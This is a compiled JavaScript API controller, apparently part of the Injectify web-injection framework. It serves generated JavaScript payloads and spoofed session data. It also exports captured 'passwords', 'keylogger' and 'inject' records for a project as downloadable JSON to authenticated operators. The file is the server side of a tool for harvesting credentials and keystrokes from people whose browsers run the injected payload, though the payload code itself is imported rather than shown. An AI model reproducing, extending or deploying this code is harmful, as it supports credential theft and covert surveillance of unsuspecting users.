"use strict";
exports.__esModule = true;
var chalk_1 = require("chalk");
var Spoof_1 = require("./Spoof");
var Payload_1 = require("./Payload");
var JSON_1 = require("./JSON");
var GithubUser_1 = require("../database/GithubUser");
var UserPermissions_1 = require("../database/UserPermissions");
var default_1 = /** @class */ (function () {
    function default_1(mongodb) {
        this.db = mongodb;
    }
    default_1.prototype.spoof = function (req, res) {
        var _this = this;
        var token = req.query.token;
        var index = parseInt(req.query.index);
        var project = decodeURIComponent(req.path.substring(11));
        /**
         * Validate the token exists, the index is a number and the project param exists
         */
        if (token && !Number.isNaN(index) && project) {
            GithubUser_1["default"](token).then(function (user) {
                var permissions = new UserPermissions_1["default"](_this.db);
                permissions.query(project, user).then(function (_a) {
                    var doc = _a.doc;
                    var api = new Spoof_1["default"](_this.db);
                    api.query(doc, index).then(function (data) {
                        res.json(data);
                    })["catch"](function (error) {
                        res.json(error);
                    });
                })["catch"](function (error) {
                    res.status(403).json(error);
                });
            })["catch"](function (error) {
                res.status(401).json(error);
            });
        }
        else {
            res.status(400).json({
                title: 'Bad request',
                message: 'Make sure you specify a project, index and token in the request',
                format: "/api/spoof/" + (project || '$project') + "?index=" + (index || '$index') + "&token=" + (token || '$token')
            });
        }
    };
    default_1.prototype.payload = function (req, res) {
        res.setHeader('Content-Type', 'application/javascript');
        Payload_1["default"](req.query).then(function (js) {
            res.send(js);
        })["catch"](function (error) {
            res.status(400).send(error);
        });
    };
    default_1.prototype.json = function (req, res) {
        var _this = this;
        var token = req.query.token;
        var page = req.path.split('/')[2];
        var project = decodeURIComponent(req.path.split('/')[3]);
        if (token && project && (page === 'passwords' || page === 'keylogger' || page === 'inject')) {
            GithubUser_1["default"](token).then(function (user) {
                var permissions = new UserPermissions_1["default"](_this.db);
                permissions.query(project, user).then(function (_a) {
                    var doc = _a.doc;
                    var api = new JSON_1["default"](_this.db);
                    api.query(doc, page).then(function (json) {
                        res.setHeader('Content-Disposition', 'filename="Injectify_API_' + doc.name + '.json"');
                        if (typeof req.query.download === 'string') {
                            res.setHeader('Content-Type', 'application/octet-stream');
                        }
                        else {
                            res.setHeader('Content-Type', 'application/json');
                        }
                        res.send(json);
                        console.log(chalk_1["default"].greenBright('[API/JSON] ') +
                            chalk_1["default"].yellowBright('delivered ') +
                            chalk_1["default"].magentaBright(page) +
                            chalk_1["default"].yellowBright(' for project ') +
                            chalk_1["default"].magentaBright(project) +
                            chalk_1["default"].redBright(" (length=" + (json ? json.length : 0) + ") ") +
                            chalk_1["default"].yellowBright('to ') +
                            chalk_1["default"].magentaBright(user.login) +
                            chalk_1["default"].redBright(' (' + user.id + ') '));
                    })["catch"](function (error) {
                        res.status(500).json(error);
                    });
                })["catch"](function (error) {
                    res.status(403).json(error);
                });
            })["catch"](function (error) {
                res.status(401).json(error);
            });
        }
        else {
            res.status(400).json({
                title: 'Bad request',
                message: 'Make sure you specify a project, page and token in the request',
                format: "/api/" + (page || '$page') + "/" + (project || '$project') + "?token=" + (token || '$token')
            });
        }
    };
    return default_1;
}());
exports["default"] = default_1;
